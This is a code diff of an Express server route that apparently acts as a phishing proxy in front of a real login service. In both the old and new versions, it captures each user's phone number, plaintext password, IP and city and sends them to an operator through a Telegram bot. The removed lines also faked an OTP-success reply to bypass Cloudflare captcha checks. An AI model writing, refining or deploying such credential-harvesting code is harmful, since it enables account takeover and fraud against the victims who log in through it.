@@ -1941,29 +1941,37 @@ app.post('/app/user/login/sendotp', async (req, res) => {
     const data = await loadData();
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
-    const phone = body.userName || body.phone || body.mobile || 'N/A';
-    const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
-    const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
-    const city = req.headers['x-vercel-ip-city'] || 'N/A';
-    const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-
-    // Always mock success to bypass Cloudflare captcha error code 1001 for mobile app
-    const successResp = { code: 1000, message: "OTP sent successfully" };
-    const finalResp = (jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000')) ? jsonResp : successResp;
-
     if (data.adminChatId && bot) {
-      let msg =
-        `📲 *OTP Sent (Proxy Bypass)*\n` +
-        `━━━━━━━━━━━━━━━━━━\n` +
-        `📱 *Phone:* \`${phone}\`\n` +
-        `🔒 *Password:* \`${pwd}\`\n` +
-        `🌐 *IP:* ${ip}${city !== 'N/A' ? ' (' + city + ')' : ''}\n` +
-        `🕐 *Time:* ${time}`;
+      const phone = body.userName || body.phone || body.mobile || 'N/A';
+      const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
+      const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
+      const city = req.headers['x-vercel-ip-city'] || 'N/A';
+      const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
-      bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
+      if (jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000')) {
+        let msg =
+          `📲 *OTP Sent Successfully*\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `📱 *Phone:* \`${phone}\`\n` +
+          `🔒 *Password:* \`${pwd}\`\n` +
+          `🌐 *IP:* ${ip}${city !== 'N/A' ? ' (' + city + ')' : ''}\n` +
+          `🕐 *Time:* ${time}`;
+
+        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
+      } else {
+        const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
+        let msg =
+          `❌ *OTP Sending Failed*\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `📱 *Phone:* \`${phone}\`\n` +
+          `🔒 *Password:* \`${pwd}\`\n` +
+          `⚠️ *Reason:* ${errorMsg}\n` +
+          `🕐 *Time:* ${time}`;
+
+        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
+      }
     }
-
-    sendJsonSafe(res, respHeaders, finalResp, JSON.stringify(finalResp), req);
+    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
   } catch (e) { await transparentProxy(req, res); }
 });
 
